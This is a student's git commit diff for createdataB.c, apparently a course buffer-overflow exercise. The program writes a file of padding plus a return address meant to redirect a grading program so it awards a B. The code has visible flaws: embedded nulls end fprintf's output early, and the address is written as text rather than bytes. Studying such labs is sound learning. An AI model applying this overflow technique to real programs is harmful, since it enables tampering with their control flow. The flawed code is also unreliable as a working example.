2d214028a31b6ca345fd2b1d3c88208103c740ab
Owen Clarke <oc8825@princeton.edu>
2025-04-28 13:45:49 -0400

    first full attemot at createdataB.c

--- createdataB.c
+++ createdataB.c
@@ -5,7 +5,14 @@ int main(void)
     FILE *psFile;
     psFile = fopen("dataB", "w");
 
-    fprintf(psFile, "Owen Clarke \n");
+    /* 25 characters */
+    fprintf(psFile, "Ben Zhou and Owen Clarke\0");
+
+    /* 23 more charcters to fill up 48 bytes of buffer */
+    fprintf(psFile, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
+
+    /* Return address for changing grade to B */
+    fprintf(psFile, "0x400894");
 
     fclose(psFile);
 
